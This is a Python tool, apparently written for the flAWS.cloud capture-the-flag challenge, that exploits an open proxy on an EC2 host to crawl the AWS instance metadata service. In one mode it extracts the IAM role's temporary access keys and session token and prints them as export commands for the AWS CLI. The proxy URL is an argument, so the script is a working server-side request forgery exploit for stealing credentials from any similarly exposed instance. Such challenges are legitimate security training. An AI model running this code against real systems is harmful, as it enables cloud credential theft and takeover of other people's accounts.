#!/usr/bin/env python3
"""
Tool to scan the IMDS of AWS via a proxy URL on EC2.
Used for the http://flAWS.cloud challenge.
"""

import json
import argparse
import requests
from requests import ConnectTimeout


class Mem:
    """ Data storage structure """

    def __init__(self):
        """init"""
        self.mem = dict()

    def set(self, path: str, value=None):
        """
        set at path the value.
        works with str, list and dict.
        """
        if path in self.mem:
            # the path exists
            if self.mem[path] is None:
                self.mem[path] = value
            elif value == self.mem[path]:
                # ignore duplicate
                pass
            elif type(self.mem[path]) == str:
                # convert str to list of str
                curr = self.mem[path]
                self.mem[path] = list()
                self.mem[path].append(curr)
                self.mem[path].append(value)
            elif type(self.mem[path]) == list:
                if value not in self.mem[path]:
                    self.mem[path].append(value)
                else:
                    # ignore duplicate in list
                    pass
            else:
                # unexpected, so debug this
                print(f'ERROR: Path={path}, Existing={self.mem[path]}, Type={type(self.mem[path])} new={value}')
                print(self.mem)
                print('*** Investigate this ***')
                exit(1)
        else:
            # new
            self.mem[path] = value

    def __str__(self):
        return json.dumps(self.mem, sort_keys=False, indent=4)


class IMDS:
    """IMDS spider"""

    def __init__(self, proxy_url=''):
        """init"""
        self.proxy_url = proxy_url
        self.imds_url = '169.254.169.254'
        self.base = len(self.uri('', ''))
        self.data = Mem()
        self.sess = requests.Session()

        print(f'[+] IMDS at {"/".join([self.proxy_url, self.imds_url])}')

    def __str__(self):
        """dump the data"""
        return str(self.data)

    def uri(self, base, leaf):
        """Build the full uri"""
        return '/'.join([self.proxy_url, self.imds_url, base, leaf])

    def spider(self, base='', leaf='latest', spider=True):
        """spider, the main function"""
        url = self.uri(base, leaf)
        key = base + '/' + leaf
        self.data.set(base, leaf)
        print(f'[+] Get {key} ... ', end='')
        try:
            req = self.sess.get(url, timeout=5)  # 5 sec
            print('OK')
            # time.sleep(1)  # 1 sec wait to give the server some slack
        except ConnectTimeout:
            # issue
            print('Connect timeout')
            self.data.set(key, '**ConnectTimeout**')
            return

        if req.status_code == 404:
            # end reached imds has no further details
            return
        if req.status_code != 200:
            # investigate this
            print(f'[-] Check {url} has {req.status_code} {req.text}')
            return


        if req.text.startswith('{'):
            # value is a json structure; store as dict
            self.data.set(key, json.loads(req.text))
            return
        if req.text.startswith('<?'):
            # value is a XML structure
            self.data.set(key, req.text)
            return
        if leaf in ['signature', 'rsa2048', 'pkcs7']:
            # known leafs that have base64 values
            self.data.set(key, req.text)
            return
        if req.headers.get('Content-Type') == 'text/plain':
            # list to spider further
            subs = req.text.splitlines()
            for sub in subs:
                if sub.endswith('/'):
                    sub = sub[:-1]
                if spider:
                    self.spider(key, sub)
                else:
                    self.data.set(key, sub)
        else:
            self.data.set(key, req.text)
            return
        return


parser = argparse.ArgumentParser('IMDS Spider')
parser.add_argument("-p", "--proxy", help="base url for IMDS, use http:// for local")
parser.add_argument("-o", "--output", help="write json to the file")
parser.add_argument("-ii", "--instance-identity", help="only instance-identity", action="store_true")
parser.add_argument("-c", "--creds", help="print env script with creds", action="store_true")

args = parser.parse_args()

# override args while running in an IDE
if args.proxy is None:
    args.proxy = 'http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy'
# args.output = 'imds.json'
# args.instance_identity = True
# args.creds = True

imds = IMDS(args.proxy)

if args.instance_identity:
    # only ec2 instance info
    imds.spider('latest/dynamic/instance-identity', 'document', spider=False)

elif args.creds:
    #
    # retrieves STS temporary token keys, identified by ASIA*
    # long term keys, identified by AKIA*
    #
    imds.spider('latest/dynamic/instance-identity', 'document', spider=False)
    # imds.spider('latest/meta-data/identity-credentials/ec2/security-credentials', 'ec2-instance', spider=False)
    imds.spider('latest/meta-data/iam','security-credentials', spider=True)

    ec2 = imds.data.mem["latest/dynamic/instance-identity/document"]
    # id1 = imds.data.mem["latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]
    role= imds.data.mem["latest/meta-data/iam/security-credentials"]
    id2 = imds.data.mem["latest/meta-data/iam/security-credentials/flaws"]

    # https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html

    print('echo Copy these aws cli credentials for http://flAWS.cloud challenge')
    print(f'export ACCOUNT_ID={ec2["accountId"]}')
    print(f'export INSTANCE_ID={ec2["instanceId"]}')
    print(f'export AWS_REGION={ec2["region"]}')
    print(f'export ROLE={role}') 
    #
    # print('# profile ec2-instance')
    # print(f'export AWS_ACCESS_KEY_ID={id1["AccessKeyId"]}')
    # print(f'export AWS_SECRET_ACCESS_KEY={id1["SecretAccessKey"]}')
    # print(f'export AWS_SESSION_TOKEN={id1["Token"]}')
    #
    print(f'# or use: aws configure with --profile {role}')
    print(f'export AWS_ACCESS_KEY_ID={id2["AccessKeyId"]}')
    print(f'export AWS_SECRET_ACCESS_KEY={id2["SecretAccessKey"]}')
    print(f'export AWS_SESSION_TOKEN={id2["Token"]}')
    print('# apply these, then call: aws sts get-caller-identity')
    exit(1)

else:
    # spider all
    imds.spider()

if args.output is None:
    print(imds)
else:
    print(f'[+] Writing JSON to file {args.output}')
    with open(args.output, "w") as file:
        file.write(str(imds))

print('Finished.')
exit(1)
